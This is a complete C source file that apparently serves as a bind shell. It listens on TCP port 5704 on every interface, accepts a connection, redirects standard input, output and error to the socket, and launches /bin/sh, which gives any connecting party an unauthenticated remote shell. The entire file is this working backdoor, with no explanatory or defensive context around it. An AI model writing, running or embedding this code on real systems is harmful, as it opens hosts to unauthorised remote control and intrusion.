#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

int main() {
	struct sockaddr_in sock;

	int socket_fd = socket(AF_INET, SOCK_STREAM, 0);

	sock.sin_family = AF_INET;
	sock.sin_port = htons(5704);
	sock.sin_addr.s_addr = INADDR_ANY;

	bind(socket_fd, (struct sockaddr *) &sock, sizeof(sock));

	listen(socket_fd, 128);

	int conn_fd = accept(socket_fd, NULL, NULL);

	dup2(conn_fd, 0);
	dup2(conn_fd, 1);
	dup2(conn_fd, 2);

	execve("/bin/sh", NULL, NULL);
	return 0;
}
